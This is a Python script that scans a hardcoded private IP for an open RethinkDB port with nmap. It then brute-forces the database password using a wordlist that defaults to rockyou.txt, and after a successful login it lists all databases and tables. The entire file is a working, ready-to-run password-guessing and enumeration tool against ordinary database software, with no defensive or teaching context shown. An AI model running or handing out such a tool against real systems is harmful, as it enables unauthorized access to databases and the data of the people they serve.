import nmap
from rethinkdb import RethinkDB
import sys
import os

def check_port_open(target, port):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, ports=str(port), arguments='-Pn')

    if target in nm.all_hosts():
        port_state = nm[target]['tcp'][port]['state']
        print(f"Nmap scan report for {target}")
        print(f"Host is {'up' if port_state == 'open' else 'down'} ({nm[target]['hostnames'][0]['name']} latency).")
        print("\nPORT      STATE SERVICE")
        print(f"{port}/tcp   {port_state}  rethinkdb\n")
        return port_state == 'open'
    else:
        return False

def ask_for_wordlist_path():
    user_input = input("Enter the path to a custom wordlist (default=rockyou.txt): ").strip()
    if not user_input:
        user_input = "/usr/share/wordlists/rockyou.txt"
    return user_input

def brute_force_password(target, wordlist_path):
    with open(wordlist_path, 'r', errors='ignore') as custom_file:
        for custom_line in custom_file:
            custom_password = custom_line.strip()
            if attempt_connection(target, custom_password):
                get_rethinkdb_databases(target, custom_password)
                return
            else:
                print(f"Failed attempt with password: {custom_password}")
    
    print("Brute force failed. Password not found.")
    sys.exit(1)

def get_rethinkdb_databases(target, password):
    r = RethinkDB()
    print("Password found:", password)
    print("Logging in...")
    conn = r.connect(host=target, port=28015, password=password)

    databases = r.db_list().run(conn)
    
    print("\nList of databases and tables:")
    for db in databases:
        print(f"{db}:")
        tables = r.db(db).table_list().run(conn)
        for table in tables:
            print(f"    {table}")

    conn.close()

def attempt_connection(target, password):
    try:
        r = RethinkDB()
        conn = r.connect(host=target, port=28015, password=password)
        conn.close()
        return True
    except Exception as e:
        return False

if __name__ == "__main__":
    target_address = "192.168.1.18"

    check_port_result = check_port_open(target_address, 28015)

    if check_port_result:
        user_input = input(f"The port 28015 is open. \nDo you want to attempt brute forcing the password for {target_address} (y/n)? ").lower()
        if user_input == 'y' or user_input == 'Y':
            password_file = ask_for_wordlist_path()
            brute_force_password(target_address, password_file)
        elif user_input == 'n' or user_input == 'N':
            print("Brute force aborted. Thank you.")
            sys.exit(0)
        else:
            print("Invalid input. Exiting.")
            sys.exit(1)
    else:
        print(f"Port 28015 is not open on {target_address}. Unable to proceed with brute forcing.")
        sys.exit(1)
